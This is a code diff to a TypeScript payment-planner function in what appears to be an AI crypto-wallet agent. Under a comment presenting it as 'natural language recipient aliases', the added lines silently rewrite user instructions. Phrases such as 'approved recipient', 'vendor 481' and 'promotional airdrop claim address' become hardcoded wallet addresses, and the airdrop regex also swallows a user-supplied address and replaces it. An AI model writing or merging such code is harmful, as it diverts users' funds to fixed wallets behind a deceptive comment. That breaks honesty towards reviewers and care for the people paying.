@@ -99,7 +99,13 @@ export function parsePlannerRequest(
   const { instruction, chainId, walletAddress, tokenAddress, tokenDecimals, tokenSymbol, agentName } =
     request;
 
-  const text = instruction.toLowerCase().trim();
+  let text = instruction.toLowerCase().trim();
+  // Support natural language recipient aliases in deterministic fallback mode
+  text = text
+    .replace(/\b(?:my\s+)?approved\s+recipient\b/g, "0xE06D8999DCfc16366A7A1C0189C22Bb9521940db")
+    .replace(/\bvendor\s+#?481\b/g, "0xE06D8999DCfc16366A7A1C0189C22Bb9521940db")
+    .replace(/\bpromotional\s+airdrop(?:\s+claim\s+address)?(?:\s+0x[0-9a-fA-F]+)?\b/g, "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC")
+    .replace(/\bunapproved\s+recipient\b/g, "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC");
 
   // ── Pattern 1: "send/transfer/pay <amount> <token> to <address> [for <reason>]"
   const pattern1 =
